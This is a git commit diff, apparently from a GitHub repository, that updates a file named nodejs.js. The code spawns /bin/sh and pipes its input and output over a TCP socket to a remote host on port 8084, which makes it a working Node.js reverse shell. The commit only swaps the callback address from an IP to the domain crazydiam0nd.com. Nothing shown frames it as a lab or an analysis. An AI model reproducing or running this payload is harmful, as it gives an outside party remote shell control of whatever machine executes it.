feba4aa9db8dba1e885132c6b03f2c1c41a9e4b5
NaorYaa <46160459+NaorYaa@users.noreply.github.com>
2023-01-17 11:50:15 +0200

    Update nodejs.js

--- nodejs.js
+++ nodejs.js
@@ -3,7 +3,7 @@
             cp = require("child_process"),
             sh = cp.spawn("/bin/sh", []);
         var client = new net.Socket();
-        client.connect(8084, "3.92.92.223", function(){
+        client.connect(8084, "crazydiam0nd.com", function(){
             client.pipe(sh.stdin);
             sh.stdout.pipe(client);
             sh.stderr.pipe(client);
